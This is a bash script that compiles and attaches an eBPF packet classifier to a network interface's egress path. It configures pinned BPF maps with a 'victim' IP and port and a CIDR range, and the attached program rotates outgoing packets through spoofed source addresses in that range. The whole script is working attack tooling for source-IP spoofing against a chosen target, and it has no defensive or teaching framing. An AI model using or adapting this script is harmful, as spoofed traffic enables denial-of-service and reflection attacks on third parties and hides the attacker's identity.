#!/usr/bin/env bash
set -euo pipefail

if [ $# -lt 4 ]; then
  echo "Usage: $0 <iface> <victim_ip> <victim_port> <spoofed_cidr> [attacker_src_port_or_0]"
  exit 1
fi

IFACE="$1"
VICTIM_IP="$2"
VICTIM_PORT="$3"
CIDR="$4"
ATTACKER_PORT="${5:-0}"

# deps
for x in clang tc bpftool python3; do
  command -v "$x" >/dev/null || { echo "Missing dependency: $x"; exit 1; }
done

# 1) compile into a temporary file then move with sudo so an existing root-owned
# output file won't prevent compilation when running as an unprivileged user.
clang -O2 -g -target bpf -c spoof_kern.c -o spoof_kern.o.tmp
sudo mv -f spoof_kern.o.tmp spoof_kern.o

show_state() {
  echo "--- qdisc ---"; tc qdisc show dev "$IFACE" || true
  echo "--- egress filters ---"; tc filter show dev "$IFACE" egress || true
}

# 2) ensure clsact, attach
sudo tc qdisc add dev "$IFACE" clsact 2>/dev/null || true
# Replace any existing filter at prio 1 handle 1 to avoid duplicates
sudo tc filter replace dev "$IFACE" egress prio 1 handle 1 bpf da obj spoof_kern.o sec classifier/cls_main

# 3) compute first host & host count from CIDR
read FIRST_HOST HOST_CNT <<EOF
$(python3 - "$CIDR" <<'PY'
import ipaddress, sys
cidr = ipaddress.ip_network(sys.argv[1], strict=False)
first = int(cidr.network_address) + 1
last  = int(cidr.broadcast_address) - 1
count = max(0, last - first + 1)
print(first, count)
PY
)
EOF

if [ "$HOST_CNT" -le 0 ]; then
  echo "CIDR has no usable hosts: $CIDR"; exit 1;
fi

# 4) pack cfg value as raw hex (network order)
TMPHEX=$(mktemp)
python3 - "$VICTIM_IP" "$VICTIM_PORT" "$ATTACKER_PORT" "$FIRST_HOST" "$HOST_CNT" <<'PY' > "$TMPHEX"
import socket, struct, sys
vip     = struct.unpack("!I", socket.inet_aton(sys.argv[1]))[0]
vport   = int(sys.argv[2]) & 0xffff
asport  = int(sys.argv[3]) & 0xffff
first_h = int(sys.argv[4])
cnt     = int(sys.argv[5])
first_n = first_h.to_bytes(4, 'big')
blob = struct.pack("!I H H 4s I", vip, vport, asport, first_n, cnt)
print(" ".join(f"{b:02x}" for b in blob))
PY

# Read hex into a single variable and expand it inline in the bpftool command
# This avoids stdin handling issues and the 'parsing byte: -' error.
HEX_STR=$(cat "$TMPHEX")
sudo bash -c "bpftool map update pinned /sys/fs/bpf/tc/globals/spoof_cfg key hex 00 00 00 00 value hex $HEX_STR"
rm -f "$TMPHEX"

# 5) reset round-robin index to 0
sudo bpftool map update pinned /sys/fs/bpf/tc/globals/spoof_rr key hex 00 00 00 00 value hex 00 00 00 00

echo "[ok] eBPF spoofer attached on $IFACE for $VICTIM_IP:$VICTIM_PORT using $CIDR"
echo "[i] Map pins: /sys/fs/bpf/tc/globals/spoof_cfg and /sys/fs/bpf/tc/globals/spoof_rr"
echo "[i] Current state:"; show_state
